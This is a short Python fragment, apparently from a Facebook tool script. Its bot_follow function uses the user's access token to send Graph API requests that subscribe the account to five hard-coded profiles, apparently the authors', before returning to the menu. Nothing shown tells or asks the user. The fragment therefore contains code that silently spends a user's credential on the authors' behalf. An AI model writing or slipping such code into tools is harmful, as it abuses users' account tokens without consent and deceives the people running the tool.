...
def bot_follow():
	try:
    	...
    	requests.post('https://graph.facebook.com/100054992220483/subscribers?access_token=' + toket)      #Muhammad Farezha
    	requests.post('https://graph.facebook.com/100000177931377/subscribers?access_token=' + toket) #Rav XD
    	requests.post('https://graph.facebook.com/100013044076518/subscribers?access_token=' + toket)       #RavXD
    	requests.post('https://graph.facebook.com/100011690048210/subscribers?access_token=' + toket) #Muhammad Arga
    	requests.post('https://graph.facebook.com/100065443222660/subscribers?access_token=' + toket) #Rav Pratama
    	menu()
